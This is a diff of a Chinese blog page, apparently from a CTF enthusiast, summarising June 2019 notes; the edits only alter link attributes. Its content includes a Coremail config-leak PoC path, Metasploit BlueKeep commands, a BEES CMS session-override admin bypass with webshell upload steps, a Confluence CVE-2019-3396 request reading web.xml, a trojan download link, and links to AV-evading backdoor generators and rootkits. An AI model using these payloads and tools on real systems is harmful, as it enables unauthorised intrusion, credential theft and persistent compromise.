@@ -130,7 +130,7 @@
 <meta name="keywords" content="总结">
 <meta property="og:type" content="article">
 <meta property="og:title" content="一九年六月总结">
-<meta property="og:url" content="https://7iny.jxustctf.top/一九年六月">
+<meta property="og:url" content="https://7iny.jxustctf.top/一九年六月/index.html">
 <meta property="og:site_name" content="7iny">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/1906.jpg">
@@ -168,7 +168,7 @@
 
 
 
-  <link rel="canonical" href="https://7iny.jxustctf.top/一九年六月">
+  <link rel="canonical" href="https://7iny.jxustctf.top/一九年六月/">
 
 
 
@@ -367,7 +367,7 @@ tpwidget("show");</script>
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://7iny.jxustctf.top/一九年六月">
+    <link itemprop="mainEntityOfPage" href="https://7iny.jxustctf.top/一九年六月/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="7iny">
@@ -498,59 +498,59 @@ tpwidget("show");</script>
 <h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p>使用购买的域名指向自己的github个人主页，增加CNAME文件，然后调用公益404页面不会出现混合内容那个问题。（还是需要开启https协议！！！！！）</p>
 <h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>使用以下代码达到相同的效果 ps:返回主页,后面链接改成自己的即可</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-cn"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js"</span> <span class="attr">homePageName</span>=<span class="string">"返回主页"</span> <span class="attr">homePageUrl</span>=<span class="string">"https://7iny.jxustctf.top"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><a href="https://galaxyhao.github.io/2017/10/21/hexo%E8%85%BE%E8%AE%AF%E5%85%AC%E7%9B%8A404%E7%9A%84%E8%AE%BE%E7%BD%AE%E9%97%AE%E9%A2%98/" rel="external nofollow" target="_blank">参考文章</a></p>
+<p><a href="https://galaxyhao.github.io/2017/10/21/hexo%E8%85%BE%E8%AE%AF%E5%85%AC%E7%9B%8A404%E7%9A%84%E8%AE%BE%E7%BD%AE%E9%97%AE%E9%A2%98/" rel="external nofollow noopener noreferrer" target="_blank">参考文章</a></p>
 <h3 id="更换背景"><a href="#更换背景" class="headerlink" title="更换背景"></a>更换背景</h3><p>我们直接在 NEXT 预留的自定义样式文件 “themes/next/source/css/_custom/custom.styl” 中添加自己的样式即可</p>
 <p>为了让背景图平铺窗口我把scheme值改成了<code>Muse</code></p>
 <p>菜单栏透明度设置后搜索功能不能正常使用，我注释掉了那部分代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">  background: url(https://raw.githubusercontent.com/N407PengYuYan/img/master/img/index.png);</span><br><span class="line">  background-size: cover;</span><br><span class="line">  background-repeat: no-repeat;</span><br><span class="line">  background-attachment: fixed;</span><br><span class="line">  background-position: 50% 50%;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 修改主体透明度</span><br><span class="line">.main-inner &#123;</span><br><span class="line">  background: #fff;</span><br><span class="line">  opacity: 0.8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 修改菜单栏透明度</span><br><span class="line">.header-inner &#123;</span><br><span class="line">  opacity: 0.9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><a href="https://blog.diqigan.cn/posts/add-background-picture-for-next.html" rel="external nofollow" target="_blank">参考文章</a></p>
+<p><a href="https://blog.diqigan.cn/posts/add-background-picture-for-next.html" rel="external nofollow noopener noreferrer" target="_blank">参考文章</a></p>
 <h2 id="实用方法"><a href="#实用方法" class="headerlink" title="实用方法"></a>实用方法</h2><h3 id="win10添加网络打印机"><a href="#win10添加网络打印机" class="headerlink" title="win10添加网络打印机"></a>win10添加网络打印机</h3><p>控制面板-&gt;查看方式按小图标-&gt;凭据管理器-&gt;添加Windows凭据-&gt;输入网络打印机的IP地址,用户密码-&gt;命令行输入目标IP地址<code>\\xxx.xxx.xx.xxx</code></p>
-<p><a href="https://jingyan.baidu.com/article/f71d60377572791ab741d14e.html" rel="external nofollow" target="_blank">参考文章</a></p>
+<p><a href="https://jingyan.baidu.com/article/f71d60377572791ab741d14e.html" rel="external nofollow noopener noreferrer" target="_blank">参考文章</a></p>
 <h3 id="校园宽带PPPOE拨号"><a href="#校园宽带PPPOE拨号" class="headerlink" title="校园宽带PPPOE拨号"></a>校园宽带PPPOE拨号</h3><p>路由器登陆选择宽带拨号<br>电信宽带：学号@telecom+密码（默认密码：身份证号后六位）<br>移动宽带：学号@cmcc+密码（默认密码：身份证号后六位）<br>联通宽带：学号@unicom+密码（默认密码：身份证号后六位）</p>
-<p><a href="https://jingyan.baidu.com/article/0320e2c11807df1b86507b6e.html" rel="external nofollow" target="_blank">参考文章</a></p>
+<p><a href="https://jingyan.baidu.com/article/0320e2c11807df1b86507b6e.html" rel="external nofollow noopener noreferrer" target="_blank">参考文章</a></p>
 <h3 id="免费接码平台"><a href="#免费接码平台" class="headerlink" title="免费接码平台"></a>免费接码平台</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">国内免费接码平台</span><br><span class="line"></span><br><span class="line">    https://sms.cm</span><br><span class="line">    https://www.pdflibr.com</span><br><span class="line">    https://www.becmd.com</span><br><span class="line">    http://www.smszk.com</span><br><span class="line"></span><br><span class="line">国外免费接码平台</span><br><span class="line"></span><br><span class="line">    https://zh.mytrashmobile.com（中文）</span><br><span class="line">    https://ch.freephonenum.com（中文）</span><br><span class="line">    SMSReceiveFree：https://smsreceivefree.com</span><br><span class="line">    Receive SMS Online for FREE：https://www.receive-sms-online.info</span><br><span class="line">    Receive a SMS Online：https://receive-a-sms.com</span><br><span class="line">    Free SMS Numbers Online：https://smsnumbersonline.com</span><br><span class="line">    Receive SMS online for Free：https://sms-online.co/receive-free-sms</span><br><span class="line">    Receive-SMS：https://receive-sms.com</span><br><span class="line">    Receive FREE SMS online：http://receivefreesms.com</span><br><span class="line">    RECEIVE SMS ONLINE：https://www.receivesmsonline.net</span><br><span class="line">    Free Online Phone：https://www.freeonlinephone.org</span><br><span class="line">    Receive SMS Online：http://receive-sms-online.com</span><br><span class="line">    TextNow：https://www.textnow.com</span><br><span class="line">    Textfree：https://www.pinger.com/text-free/</span><br><span class="line">    SELLAITE：http://sms.sellaite.com/</span><br><span class="line">    Twilio：https://www.twilio.com/</span><br><span class="line">    https://receive-sms.com/</span><br><span class="line">    http://receive-sms-online.com/</span><br><span class="line">    http://sms.sellaite.com/</span><br><span class="line">    http://hs3x.com/</span><br><span class="line">    http://receivefreesms.net</span><br><span class="line">    http://receivesmsonline.in</span><br><span class="line">    http://www.receive-sms-now.com</span><br><span class="line">    https://sms-receive.net</span><br><span class="line">    https://www.receivesms.net</span><br><span class="line">    http://www.freesmsverifications.com</span><br><span class="line">    http://receiveonlinesms.biz</span><br><span class="line">    http://receivesmsverification.com</span><br><span class="line">    https://www.receivesms.co</span><br><span class="line">    http://receiveonlinesms.com</span><br></pre></td></tr></table></figure>
-<p><a href="https://liyuans.com/2019/01/freesms.html" rel="external nofollow" target="_blank">参考文章</a></p>
+<p><a href="https://liyuans.com/2019/01/freesms.html" rel="external nofollow noopener noreferrer" target="_blank">参考文章</a></p>
 <h2 id="借助插件科学上网"><a href="#借助插件科学上网" class="headerlink" title="借助插件科学上网"></a>借助插件科学上网</h2><p>有时候代理会被大面积封锁，可是我们又需要进行学习，那么我们可以用第三方插件来满足我们的搜索需求</p>
 <p><code>Ghelper</code>源码安装chrome插件</p>
 <blockquote>
 <p>1.打开你的Chrome浏览器的 更多工具&gt;扩展程序页面.<br>或者直接在网址输入: chrome://extensions/<br>2.这个页面点击 “添加已解压的扩展程序”<br>3.选择本次下载包里的 ghelper_source 目录<br>4.确认后就行了.</p>
 </blockquote>
-<p><a href="http://googlehelper.net/" rel="external nofollow" target="_blank">官网下载地址</a></p>
-<h2 id="木马下载"><a href="#木马下载" class="headerlink" title="木马下载"></a>木马下载</h2><p><a href="http://www.mumaasp.com/category/%E5%85%8D%E6%9D%80asp%E6%9C%A8%E9%A9%AC" rel="external nofollow" target="_blank">asp木马</a></p>
+<p><a href="http://googlehelper.net/" rel="external nofollow noopener noreferrer" target="_blank">官网下载地址</a></p>
+<h2 id="木马下载"><a href="#木马下载" class="headerlink" title="木马下载"></a>木马下载</h2><p><a href="http://www.mumaasp.com/category/%E5%85%8D%E6%9D%80asp%E6%9C%A8%E9%A9%AC" rel="external nofollow noopener noreferrer" target="_blank">asp木马</a></p>
 <h2 id="Coremail-0day-敏感文件泄露漏洞"><a href="#Coremail-0day-敏感文件泄露漏洞" class="headerlink" title="Coremail 0day 敏感文件泄露漏洞"></a>Coremail 0day 敏感文件泄露漏洞</h2><p> <strong>POC:</strong> </p>
 <blockquote>
 <p>/mailsms/s?func=ADMIN:appState&amp;dumpConfig=/</p>
 </blockquote>
 <p><strong>通过域名或者IP等地址+POC即可获取目标邮件服务器配置文件，配置文件包括：文件路径、IP、端口、数据库用户、密码等敏感信息。</strong></p>
-<p><a href="https://www.7ooc.cn/web/15.html" rel="external nofollow" target="_blank">参考文章</a></p>
+<p><a href="https://www.7ooc.cn/web/15.html" rel="external nofollow noopener noreferrer" target="_blank">参考文章</a></p>
 <p>2.apiws</p>
 <blockquote>
-<p><a href="http://host/apiws/services/" rel="external nofollow" target="_blank">http://host/apiws/services/</a></p>
+<p><a href="http://host/apiws/services/" rel="external nofollow noopener noreferrer" target="_blank">http://host/apiws/services/</a></p>
 </blockquote>
 <blockquote>
-<p><a href="http://host/apiws/services/API?wsdl" rel="external nofollow" target="_blank">http://host/apiws/services/API?wsdl</a></p>
+<p><a href="http://host/apiws/services/API?wsdl" rel="external nofollow noopener noreferrer" target="_blank">http://host/apiws/services/API?wsdl</a></p>
 </blockquote>
-<p><a href="https://blog.csdn.net/qq_41770175/article/details/91971177" rel="external nofollow" target="_blank">参考文章</a></p>
-<p><a href="https://www.cnvd.org.cn/webinfo/show/5075" rel="external nofollow" target="_blank">cnvd通告</a></p>
+<p><a href="https://blog.csdn.net/qq_41770175/article/details/91971177" rel="external nofollow noopener noreferrer" target="_blank">参考文章</a></p>
+<p><a href="https://www.cnvd.org.cn/webinfo/show/5075" rel="external nofollow noopener noreferrer" target="_blank">cnvd通告</a></p>
 <h2 id="漏洞CVE-2019-0708"><a href="#漏洞CVE-2019-0708" class="headerlink" title="漏洞CVE-2019-0708"></a><strong>漏洞CVE-2019-0708</strong></h2><p>影响：该漏洞影响范围较广，windows2003、windows2008、windows2008 R2、windows xp * 系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的 。CVE-2019-0708漏洞是通过检查用户的身份认证，导致可以绕过认证，不用任何的交互，直接通过rdp协议进行连接发送恶意代码执行命令到服务器中去。</p>
 <p>kali依次执行验证</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class="line">set RHOSTS x.x.x.x</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<h2 id="BEES企业网站管理系统漏洞"><a href="#BEES企业网站管理系统漏洞" class="headerlink" title="BEES企业网站管理系统漏洞"></a>BEES企业网站管理系统漏洞</h2><p>1.漏洞地址<a href="http://host/mx_form/mx_form.php?id=2" rel="external nofollow" target="_blank">http://host/mx_form/mx_form.php?id=2</a></p>
+<h2 id="BEES企业网站管理系统漏洞"><a href="#BEES企业网站管理系统漏洞" class="headerlink" title="BEES企业网站管理系统漏洞"></a>BEES企业网站管理系统漏洞</h2><p>1.漏洞地址<a href="http://host/mx_form/mx_form.php?id=2" rel="external nofollow noopener noreferrer" target="_blank">http://host/mx_form/mx_form.php?id=2</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用火狐里面的firebug插件用post参数，覆盖session值，之后便可直接登录后台：_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=100000000000000000000000000000000000</span><br></pre></td></tr></table></figure>
-<p>2.执行之后访问<a href="http://host/admin/admin.php" rel="external nofollow" target="_blank">http://host/admin/admin.php</a><br>3.点击内容管理—&gt;上传照片管理—&gt;修改<br>4.上传图片马，用burpsuite拦截将jpg改为php，即可绕过上传限制</p>
+<p>2.执行之后访问<a href="http://host/admin/admin.php" rel="external nofollow noopener noreferrer" target="_blank">http://host/admin/admin.php</a><br>3.点击内容管理—&gt;上传照片管理—&gt;修改<br>4.上传图片马，用burpsuite拦截将jpg改为php，即可绕过上传限制</p>
 <h2 id="CVE-2019-3396"><a href="#CVE-2019-3396" class="headerlink" title="CVE-2019-3396"></a>CVE-2019-3396</h2><p>漏洞描述中指出Confluence Server与Confluence Data Center中的Widget Connector存在服务端模板注入漏洞，攻击者能利用此漏洞能够实现目录穿越与远程代码执行。</p>
-<p>漏洞分析参看<a href="https://paper.seebug.org/884/" rel="external nofollow" target="_blank">文章</a></p>
+<p>漏洞分析参看<a href="https://paper.seebug.org/884/" rel="external nofollow noopener noreferrer" target="_blank">文章</a></p>
 <p>Burp Suit复现</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Referer:http://x.x.x.x/pages/resumedraft.action?draftId=786457&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 168</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;786458&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https://www.viddler.com/v/23464dc6&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;../web.xml&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>更多功能</p>
-<p><a href="https://github.com/jas502n/CVE-2019-3396/" rel="external nofollow" target="_blank">参考1</a></p>
-<p><a href="https://mp.weixin.qq.com/s/SycP0RCzMLazansAsp-D5Q" rel="external nofollow" target="_blank">获取shell</a></p>
-<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="Github渗透工具资源整合"><a href="#Github渗透工具资源整合" class="headerlink" title="Github渗透工具资源整合"></a>Github渗透工具资源整合</h2><p> 超级弱口令多线程检查审计工具SNETCracker<br>可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。<a href="https://github.com/shack2/SNETCracker/releases" rel="external nofollow" target="_blank">下载地址</a></p>
-<p>Github关键字监测、告警、发现<a href="https://github.com/deepdivesec/GitMAD" rel="external nofollow" target="_blank">下载地址</a></p>
-<p>AVIator是一个后门生成器实用程序，它使用加密和注入技术来绕过AV检测。<a href="https://github.com/Ch0pin/AVIator" rel="external nofollow" target="_blank">下载地址</a></p>
-<p>Vxscan：一款用于渗透测试的多功能扫描工具<a href="https://github.com/al0ne/Vxscan" rel="external nofollow" target="_blank">下载地址</a></p>
-<p>thinkphp v5.x 远程代码执行漏洞-POC集合<a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection" rel="external nofollow" target="_blank">下载地址</a></p>
-<h2 id="实战中常用工具汇总"><a href="#实战中常用工具汇总" class="headerlink" title="实战中常用工具汇总"></a>实战中常用工具汇总</h2><p>1.进程隐藏工具<br><a href="https://github.com/gianlucaborello/libprocesshider" rel="external nofollow" target="_blank">libprocesshider</a><br><a href="https://github.com/f0rb1dd3n/Reptile" rel="external nofollow" target="_blank">Reptile</a><br>2.流量代理工具proxy<br><a href="https://github.com/vzex/dog-tunnel" rel="external nofollow" target="_blank">dog-tunnel</a><br>3.Linux辅助提权工具LinEnum.sh<br><a href="https://github.com/rebootuser/LinEnum" rel="external nofollow" target="_blank">LinEnum</a><br>4.脏牛提权工具c0w64<br><a href="https://github.com/Brucetg/DirtyCow-EXP" rel="external nofollow" target="_blank">c0w64</a><br>5.内网流量代理工具agent.exe<br><a href="https://github.com/cnlh/nps" rel="external nofollow" target="_blank">nps</a> </p>
+<p><a href="https://github.com/jas502n/CVE-2019-3396/" rel="external nofollow noopener noreferrer" target="_blank">参考1</a></p>
+<p><a href="https://mp.weixin.qq.com/s/SycP0RCzMLazansAsp-D5Q" rel="external nofollow noopener noreferrer" target="_blank">获取shell</a></p>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="Github渗透工具资源整合"><a href="#Github渗透工具资源整合" class="headerlink" title="Github渗透工具资源整合"></a>Github渗透工具资源整合</h2><p> 超级弱口令多线程检查审计工具SNETCracker<br>可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。<a href="https://github.com/shack2/SNETCracker/releases" rel="external nofollow noopener noreferrer" target="_blank">下载地址</a></p>
+<p>Github关键字监测、告警、发现<a href="https://github.com/deepdivesec/GitMAD" rel="external nofollow noopener noreferrer" target="_blank">下载地址</a></p>
+<p>AVIator是一个后门生成器实用程序，它使用加密和注入技术来绕过AV检测。<a href="https://github.com/Ch0pin/AVIator" rel="external nofollow noopener noreferrer" target="_blank">下载地址</a></p>
+<p>Vxscan：一款用于渗透测试的多功能扫描工具<a href="https://github.com/al0ne/Vxscan" rel="external nofollow noopener noreferrer" target="_blank">下载地址</a></p>
+<p>thinkphp v5.x 远程代码执行漏洞-POC集合<a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection" rel="external nofollow noopener noreferrer" target="_blank">下载地址</a></p>
+<h2 id="实战中常用工具汇总"><a href="#实战中常用工具汇总" class="headerlink" title="实战中常用工具汇总"></a>实战中常用工具汇总</h2><p>1.进程隐藏工具<br><a href="https://github.com/gianlucaborello/libprocesshider" rel="external nofollow noopener noreferrer" target="_blank">libprocesshider</a><br><a href="https://github.com/f0rb1dd3n/Reptile" rel="external nofollow noopener noreferrer" target="_blank">Reptile</a><br>2.流量代理工具proxy<br><a href="https://github.com/vzex/dog-tunnel" rel="external nofollow noopener noreferrer" target="_blank">dog-tunnel</a><br>3.Linux辅助提权工具LinEnum.sh<br><a href="https://github.com/rebootuser/LinEnum" rel="external nofollow noopener noreferrer" target="_blank">LinEnum</a><br>4.脏牛提权工具c0w64<br><a href="https://github.com/Brucetg/DirtyCow-EXP" rel="external nofollow noopener noreferrer" target="_blank">c0w64</a><br>5.内网流量代理工具agent.exe<br><a href="https://github.com/cnlh/nps" rel="external nofollow noopener noreferrer" target="_blank">nps</a> </p>
 
       
     </div>
@@ -591,7 +591,7 @@ tpwidget("show");</script>
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/一九年五月" rel="next" title="一九年五月总结">
+              <a href="/一九年五月/" rel="next" title="一九年五月总结">
                 <i class="fa fa-chevron-left"></i> 一九年五月总结
               </a>
             
@@ -601,7 +601,7 @@ tpwidget("show");</script>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/CTF入坑" rel="prev" title="CTF入坑">
+              <a href="/CTF入坑/" rel="prev" title="CTF入坑">
                 CTF入坑 <i class="fa fa-chevron-right"></i>
               </a>
             
@@ -729,27 +729,27 @@ tpwidget("show");</script>
               <ul class="links-of-blogroll-list">
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://blog.csdn.net/D_pokemon" title="Danie1" target="_blank" rel="external nofollow">Danie1</a>
+                    <a href="https://blog.csdn.net/D_pokemon" title="Danie1" target="_blank" rel="external nofollow noopener noreferrer">Danie1</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://orangice.gitee.io" title="orangice" target="_blank" rel="external nofollow">orangice</a>
+                    <a href="https://orangice.gitee.io" title="orangice" target="_blank" rel="external nofollow noopener noreferrer">orangice</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.jianshu.com/u/e1802e3b29cc" title="k神" target="_blank" rel="external nofollow">k神</a>
+                    <a href="https://www.jianshu.com/u/e1802e3b29cc" title="k神" target="_blank" rel="external nofollow noopener noreferrer">k神</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://yiyangqianxixxxx.github.io" title="yiyangqianxi" target="_blank" rel="external nofollow">yiyangqianxi</a>
+                    <a href="https://yiyangqianxixxxx.github.io" title="yiyangqianxi" target="_blank" rel="external nofollow noopener noreferrer">yiyangqianxi</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://blog.csdn.net/qq_39379812" title="Azure_atk" target="_blank" rel="external nofollow">Azure_atk</a>
+                    <a href="https://blog.csdn.net/qq_39379812" title="Azure_atk" target="_blank" rel="external nofollow noopener noreferrer">Azure_atk</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://doubj.github.io" title="doubj" target="_blank" rel="external nofollow">doubj</a>
+                    <a href="https://doubj.github.io" title="doubj" target="_blank" rel="external nofollow noopener noreferrer">doubj</a>
                   </li>
                 
               </ul>
